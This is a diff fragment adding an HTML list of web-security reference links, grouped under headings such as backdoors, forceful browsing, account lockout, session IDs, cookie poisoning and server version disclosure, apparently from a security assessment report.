+  <p><a href="http://en.wikipedia.org/wiki/Backdoor" class="Hyperlink" style="font-weight:bold;">Wikipedia: Back door</a></p>
+
+  <p><a href="http://www.windowsecurity.com/articles/Hidden_Backdoors_Trojan_Horses_and_Rootkit_Tools_in_a_Windows_Environment.html" class="Hyperlink" style="font-weight:bold;">WindowSecurity.com: Hidden Backdoors, Trojan Horses and Rootkit Tools in a Windows Environment</a></p>
+
+  <p><a href="http://www.icir.org/vern/papers/backdoor/backdoor.html" class="Hyperlink" style="font-weight:bold;">Detecting Backdoors: By Yin Zhang and Vern Paxson</a></p>
+
+  <p><strong>--------------------------------------------------------------------------------------------------------------------------------</strong></p>
+
+  <p><strong>Forceful browsing resources</strong></p>
+
+  <p><a href="http://www.imperva.com/resources/glossary/forceful_browsing.html" class="Hyperlink" style="font-weight:bold;">Imperva Glossary: Forceful Browsing</a></p>
+
+  <p><a href="http://en.wikipedia.org/wiki/Forceful_browsing" class="Hyperlink" style="font-weight:bold;">Wikipedia: Forceful browsing</a></p>
+
+  <p><a href="http://www.owasp.org/index.php/Forceful_browsing" class="Hyperlink" style="font-weight:bold;">OWASP: Forceful browsing description</a></p>
+
+  <p><a href="http://www.owasp.org/index.php/Insecure_Temporary_File" class="Hyperlink" style="font-weight:bold;">OWASP: Insecure Temporary File</a></p>
+
+  <p><a href="http://en.wikipedia.org/wiki/8.3" class="Hyperlink" style="font-weight:bold;">http://en.wikipedia.org/wiki/8.3</a></p>
+
+  <p><a href="http://www.linuxsecurity.com/content/view/115462/151/" class="Hyperlink" style="font-weight:bold;">http://www.linuxsecurity.com/content/view/115462/151/</a></p>
+
+  <p><a href="http://apache-server.com/tutorials/ATusing-htaccess.html" class="Hyperlink" style="font-weight:bold;">http://apache-server.com/tutorials/ATusing-htaccess.html</a></p>
+
+  <p><a href="http://ecf-guest.mit.edu/~jc/doc/HiddenWeb.html" class="Hyperlink" style="font-weight:bold;">http://ecf-guest.mit.edu/~jc/doc/HiddenWeb.html</a></p>
+
+  <p><a href="http://www.owasp.org/index.php/Using_password_systems" class="Hyperlink" style="font-weight:bold;">http://www.owasp.org/index.php/Using_password_systems</a></p>
+
+  <p><a href="http://en.wikipedia.org/wiki/Password" class="Hyperlink" style="font-weight:bold;">http://en.wikipedia.org/wiki/Password</a></p>
+
+  <p><a href="http://www.smat.us/sanity/pwdilemma.html" class="Hyperlink" style="font-weight:bold;">http://www.smat.us/sanity/pwdilemma.html</a></p>
+
+  <p><a href="http://www.privisec.com/final/articles/INTERNET%20SECURITY%20ADVISOR%20PasswordParadox%20Insecure%20Security.htm" class="Hyperlink" style="font-weight:bold;">http://www.privisec.com/final/articles/INTERNET%20SECURITY%20ADVISOR%20PasswordParadox%20Insecure%20Security.htm</a></p>
+
+  <p><a href="http://www.macronimous.com/resources/Secure_Password_Programming.asp" class="Hyperlink" style="font-weight:bold;">http://www.macronimous.com/resources/Secure_Password_Programming.asp</a></p>
+
+  <p><a href="http://news.com.com/Password+flaw+cracks+Passport+security/2100-1002_3-1000429.html" class="Hyperlink" style="font-weight:bold;">http://news.com.com/Password+flaw+cracks+Passport+security/2100-1002_3-1000429.html</a></p>
+
+  <p><strong>--------------------------------------------------------------------------------------------------------------------------------</strong></p>
+
+  <p><strong>The CISS v3.1R section 2.7 requires that accounts are locked out after 6 failed login attempts.</strong></p>
+
+  <p><a href="http://www.owasp.org/index.php/Account_lockout_attack" class="Hyperlink" style="font-weight:bold;">http://www.owasp.org/index.php/Account_lockout_attack</a></p>
+
+  <p><a href="http://en.wikipedia.org/wiki/Dictionary_attack" class="Hyperlink" style="font-weight:bold;">http://en.wikipedia.org/wiki/Dictionary_attack</a></p>
+
+  <p><a href="http://en.wikipedia.org/wiki/Password_cracking" class="Hyperlink" style="font-weight:bold;">http://en.wikipedia.org/wiki/Password_cracking</a></p>
+
+  <p><a href="http://www.sfgate.com/cgi-bin/article.cgi?f=/c/a/2005/10/21/SNAFU.TMP" class="Hyperlink" style="font-weight:bold;">http://www.sfgate.com/cgi-bin/article.cgi?f=/c/a/2005/10/21/SNAFU.TMP</a></p>
+
+  <p><a href="http://www.seas.rochester.edu/CNG/docs/Security/node7.html" class="Hyperlink" style="font-weight:bold;">http://www.seas.rochester.edu/CNG/docs/Security/node7.html</a></p>
+
+  <p><a href="http://osvdb.org/" class="Hyperlink" style="font-weight:bold;">http://osvdb.org/</a></p>
+
+  <p><a href="http://en.wikipedia.org/wiki/Strings_%28Unix%29" class="Hyperlink" style="font-weight:bold;">http://en.wikipedia.org/wiki/Strings_%28Unix%29</a></p>
+
+  <p><strong>--------------------------------------------------------------------------------------------------------------------------------</strong></p>
+
+  <p><strong>Weak Second Tier Authentication Control</strong></p>
+
+  <p><a href="http://channel9.msdn.com/wiki/default.aspx/Channel9.WebAppSecurityArchDesignReview" class="Hyperlink" style="font-weight:bold;">http://channel9.msdn.com/wiki/default.aspx/Channel9.WebAppSecurityArchDesignReview</a></p>
+
+  <p><a href="http://bsd.phoenix.az.us/presentations/kerberos5intro" class="Hyperlink" style="font-weight:bold;">http://bsd.phoenix.az.us/presentations/kerberos5intro</a></p>
+
+  <p><a href="http://www.owasp.org/index.php/Web_Services" class="Hyperlink" style="font-weight:bold;">http://www.owasp.org/index.php/Web_Services</a></p>
+
+  <p><a href="http://www.webappsec.org/projects/threat/classes/credential_session_prediction.shtml" class="Hyperlink" style="font-weight:bold;">http://www.webappsec.org/projects/threat/classes/credential_session_prediction.shtml</a></p>
+
+  <p><a href="http://support.microsoft.com/default.aspx?scid=kb;en-us;810572" class="Hyperlink" style="font-weight:bold;">http://support.microsoft.com/default.aspx?scid=kb;en-us;810572</a></p>
+
+  <p><a href="http://www.unixpapa.com/auth/homebuilt.html" class="Hyperlink" style="font-weight:bold;">http://www.unixpapa.com/auth/homebuilt.html</a></p>
+
+  <p><a href="http://www.cgisecurity.com/lib/SessionIDs.pdf" class="Hyperlink" style="font-weight:bold;">http://www.cgisecurity.com/lib/SessionIDs.pdf</a></p>
+
+  <p><strong>--------------------------------------------------------------------------------------------------------------------------------</strong></p>
+
+  <p><strong>Session Control Resources</strong></p>
+
+  <p><a href="http://www.cgisecurity.com/lib/SessionIDs.pdf" class="Hyperlink" style="font-weight:bold;">http://www.cgisecurity.com/lib/SessionIDs.pdf</a></p>
+
+  <p><a href="http://ciac.llnl.gov/ciac/bulletins/f-08.shtml" class="Hyperlink" style="font-weight:bold;">http://ciac.llnl.gov/ciac/bulletins/f-08.shtml</a></p>
+
+  <p><a href="http://msdn.microsoft.com/ie/default.aspx?pull=/library/en-%20us/dnwebgen/html/ie_introfiddler.asp" class="Hyperlink" style="font-weight:bold;">http://msdn.microsoft.com/ie/default.aspx?pull=/library/en- us/dnwebgen/html/ie_introfiddler.asp</a></p>
+
+  <p><a href="http://www.internettg.org/newsletter/mar00/workshop_session_management.html" class="Hyperlink" style="font-weight:bold;">http://www.internettg.org/newsletter/mar00/workshop_session_management.html</a></p>
+
+  <p><strong>--------------------------------------------------------------------------------------------------------------------------------</strong></p>
+
+  <p><strong>Session ID</strong></p>
+
+  <p><a href="http://www.securityfocus.com/infocus/1774" class="Hyperlink" style="font-weight:bold;">http://www.securityfocus.com/infocus/1774</a></p>
+
+  <p><a href="http://www.imperva.com/application_defense_center/glossary/session_hijacking.html" class="Hyperlink" style="font-weight:bold;">http://www.imperva.com/application_defense_center/glossary/session_hijacking.html</a></p>
+
+  <p><a href="http://www.cert.org/advisories/CA-2000-02.html" class="Hyperlink" style="font-weight:bold;">http://www.cert.org/advisories/CA-2000-02.html</a></p>
+
+  <p><a href="http://www.ciac.org/ciac/bulletins/i-034.shtml" class="Hyperlink" style="font-weight:bold;">http://www.ciac.org/ciac/bulletins/i-034.shtml</a></p>
+
+  <p><a href="http://www.portswigger.net/proxy/help.html" class="Hyperlink" style="font-weight:bold;">http://www.portswigger.net/proxy/help.html</a></p>
+
+  <p><strong>--------------------------------------------------------------------------------------------------------------------------------</strong></p>
+
+  <p><strong>Cookies Resources</strong></p>
+
+  <p><a href="http://en.wikipedia.org/wiki/HTTP_cookie" class="Hyperlink" style="font-weight:bold;">http://en.wikipedia.org/wiki/HTTP_cookie</a></p>
+
+  <p><a href="http://www.cgisecurity.com/lib/CookiePoisoningByline.pdf" class="Hyperlink" style="font-weight:bold;">http://www.cgisecurity.com/lib/CookiePoisoningByline.pdf</a></p>
+
+  <p><a href="http://www.imperva.com/application_defense_center/glossary/cookie_poisoning.html" class="Hyperlink" style="font-weight:bold;">http://www.imperva.com/application_defense_center/glossary/cookie_poisoning.html</a></p>
+
+  <p><a href="http://en.wikipedia.org/wiki/Cookie_poisoning" class="Hyperlink" style="font-weight:bold;">http://en.wikipedia.org/wiki/Cookie_poisoning</a></p>
+
+  <p><strong>--------------------------------------------------------------------------------------------------------------------------------</strong></p>
+
+  <p><strong>Error Messages</strong></p>
+
+  <p><a href="http://en.wikipedia.org/wiki/HTTP_cookie" class="Hyperlink" style="font-weight:bold;">http://en.wikipedia.org/wiki/HTTP_cookie</a></p>
+
+  <p><a href="http://www.cgisecurity.com/lib/CookiePoisoningByline.pdf" class="Hyperlink" style="font-weight:bold;">http://www.cgisecurity.com/lib/CookiePoisoningByline.pdf</a></p>
+
+  <p><strong>--------------------------------------------------------------------------------------------------------------------------------</strong></p>
+
+  <p><a href="http://www.onguardonline.gov/spam.html" class="Hyperlink" style="font-weight:bold;">http://www.onguardonline.gov/spam.html</a></p>
+
+  <p><a href="http://publications.csail.mit.edu/abstracts/abstracts05/jyjung/jyjung.html" class="Hyperlink" style="font-weight:bold;">http://publications.csail.mit.edu/abstracts/abstracts05/jyjung/jyjung.html</a></p>
+
+  <p><a href="http://www.isoc.org/isoc/conferences/ndss/06/proceedings/html/2006/papers/inoculating_SSH.pdf" class="Hyperlink" style="font-weight:bold;">http://www.isoc.org/isoc/conferences/ndss/06/proceedings/html/2006/papers/inoculating_SSH.pdf</a></p>
+
+  <p><a href="http://en.wikipedia.org/wiki/Web_crawler" class="Hyperlink" style="font-weight:bold;">http://en.wikipedia.org/wiki/Web_crawler</a></p>
+
+  <p><a href="http://en.wikipedia.org/wiki/Spambot" class="Hyperlink" style="font-weight:bold;">http://en.wikipedia.org/wiki/Spambot</a></p>
+
+  <p><a href="http://www.ohlone.cc.ca.us/org/webcenter/emailencoding.html" class="Hyperlink" style="font-weight:bold;">http://www.ohlone.cc.ca.us/org/webcenter/emailencoding.html</a></p>
+
+  <p><strong>--------------------------------------------------------------------------------------------------------------------------------</strong></p>
+
+  <p><strong>Source Code Disclosure</strong></p>
+
+  <p><a href="http://www.cgisecurity.com/lib/SessionIDs.pdf" class="Hyperlink" style="font-weight:bold;">http://www.cgisecurity.com/lib/SessionIDs.pdf</a></p>
+
+  <p><a href="http://ciac.llnl.gov/ciac/bulletins/f-08.shtml" class="Hyperlink" style="font-weight:bold;">http://ciac.llnl.gov/ciac/bulletins/f-08.shtml</a></p>
+
+  <p><a href="http://www.verisign.com" class="Hyperlink" style="font-weight:bold;">http://www.verisign.com</a></p>
+
+  <p><a href="http://msdn.microsoft.com/404/default.aspx" class="Hyperlink" style="font-weight:bold;">http://msdn.microsoft.com/404/default.aspx</a></p>
+
+  <p><strong>--------------------------------------------------------------------------------------------------------------------------------</strong></p>
+
+  <p><strong>WebServer Version Revealed OSVDB Website for Vulneralities of Webserver (Apache)</strong></p>
+
+  <p><a href="http://evolt.org/node/60160" class="Hyperlink" style="font-weight:bold;">http://evolt.org/node/60160</a></p>
+
+  <p><a href="http://www.brandonhutchinson.com/remote_web_server_version.html" class="Hyperlink" style="font-weight:bold;">http://www.brandonhutchinson.com/remote_web_server_version.html</a></p>
+
+  <p><a href="http://www.osvdb.org/" class="Hyperlink" style="font-weight:bold;">http://www.osvdb.org/</a></p>
+
+  <p><strong>--------------------------------------------------------------------------------------------------------------------------------</strong></p>
+
+  <p><strong>VBScript Messages</strong></p>
+
+  <p><a href="http://www.bigbold.com/snippets/posts/show/249" class="Hyperlink" style="font-weight:bold;">http://www.bigbold.com/snippets/posts/show/249</a></p>
+
+  <p><a href="http://www.csidata.com/custserv/onlinehelp/VBSdocs/vbs241.htm" class="Hyperlink" style="font-weight:bold;">http://www.csidata.com/custserv/onlinehelp/VBSdocs/vbs241.htm</a></p>
+
+  <p><a href="http://www.kuam.com/techtalk/errorhandling.htm" class="Hyperlink" style="font-weight:bold;">http://www.kuam.com/techtalk/errorhandling.htm</a></p>
+
+  <p><a href="http://www.verisign.com/security-intelligence-service/current-intelligence/vulnerability-%20advisories/2004/77.html" class="Hyperlink" style="font-weight:bold;">http://www.verisign.com/security-intelligence-service/current-intelligence/vulnerability- advisories/2004/77.html</a></p>
+
+  <p><a href="http://www.greymagic.com/security/advisories/gm010-ie/" class="Hyperlink" style="font-weight:bold;">http://www.greymagic.com/security/advisories/gm010-ie/</a></p>
+
+  <p><a href="http://support.microsoft.com/?kbid=209855" class="Hyperlink" style="font-weight:bold;">http://support.microsoft.com/?kbid=209855</a></p>
+
+  <p><a href="http://www.osvdb.com" class="Hyperlink" style="font-weight:bold;">http://www.osvdb.com</a></p>
+</div>
